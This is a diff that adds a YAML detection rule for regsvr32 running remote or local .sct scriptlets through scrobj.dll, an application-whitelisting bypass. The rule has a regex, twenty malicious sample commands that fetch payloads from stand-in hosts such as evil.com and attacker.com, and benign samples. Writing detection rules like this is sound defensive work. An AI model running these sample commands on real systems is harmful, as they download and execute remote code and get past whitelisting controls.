@@ -1,0 +1,46 @@
+name: high-16-regsvr32
+severity: high
+description: >
+  Detects regsvr32 executing remote scriptlets or DLLs. Application whitelisting bypass technique.
+  various flag combinations, URL protocols (HTTP/HTTPS/FTP), and .sct file extensions in any context.
+  Legitimate use of regsvr32 involves local DLL files in System32 or Program Files, never remote URLs
+  or scriptlets. Also detects local .sct files which may have been dropped by other malware components.
+
+pattern: |
+  (?i)regsvr32(?:\.exe)?[\s\r\n]+(?:[^\r\n]*?(?:/s|/u|/n|/i:)[\s\r\n]+)*[^\r\n]*?(?:/i:(?:http://|https://|ftp://)|scrobj\.dll.*?(?:http://|https://|ftp://)|\.sct)
+
+malicious:
+  - "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
+  - "regsvr32.exe /u /i:https://attacker.com/malicious.sct scrobj.dll"
+  - "REGSVR32 /I:http://malware.com/backdoor.sct SCROBJ.DLL"
+  - 'regsvr32 /s /i:"http://evil.com/dropper.sct" scrobj.dll'
+  - "regsvr32.exe /u /n /i:ftp://evil.com/payload.sct scrobj.dll"
+  - "regsvr32 /i:http://bad.com/clickfix.sct scrobj.dll"
+  - "regsvr32.exe /s /i:https://192.168.1.100/malware.sct scrobj.dll"
+  - "regsvr32 /u /i:http://attacker.com/stage2.sct scrobj.dll"
+  - "cmd /c regsvr32 /s /n /u /i:http://evil.com/implant.sct scrobj.dll"
+  - "regsvr32.exe /i:https://malware.com/ransomware.sct scrobj.dll"
+  - "regsvr32 /s /u /i:ftp://evil.com/trojan.sct scrobj.dll"
+  - 'regsvr32.exe /i:"http://evil.com/clickfix-installer.sct" scrobj.dll'
+  - "regsvr32 /s /n /i:https://attacker.com/loader.sct scrobj.dll"
+  - "regsvr32.exe C:\\Temp\\malicious.sct"
+  - "regsvr32 /u /i:http://evil.com/backdoor.sct scrobj.dll"
+  - "regsvr32.exe /s /i:https://malware.com/obfuscated.sct scrobj.dll"
+  - "regsvr32 C:\\Users\\Public\\Downloads\\dropper.sct"
+  - "regsvr32.exe /u /n /i:http://192.168.1.50:8080/payload.sct scrobj.dll"
+  - "regsvr32 /i:https://evil.com/reverse-shell.sct scrobj.dll"
+  - "regsvr32.exe /s C:\\Windows\\Temp\\evil.sct"
+
+benign:
+  - "regsvr32 C:\\Windows\\System32\\comctl32.dll"
+  - "regsvr32.exe /u C:\\Program Files\\MyApp\\component.dll"
+  - "regsvr32 mshtml.dll"
+  - "regsvr32.exe /s oleaut32.dll"
+  - "regsvr32 /u MyControl.ocx"
+  - "regsvr32.exe C:\\Windows\\System32\\atl.dll"
+  - "regsvr32 /s C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll"
+  - "regsvr32.exe shimgvw.dll"
+  - "regsvr32 /u /s C:\\Windows\\System32\\wuaueng.dll"
+  - "regsvr32.exe vbscript.dll"
+  - "regsvr32 C:\\Windows\\System32\\jscript.dll"
+  - "regsvr32.exe /s /u C:\\Program Files\\Adobe\\component.dll"
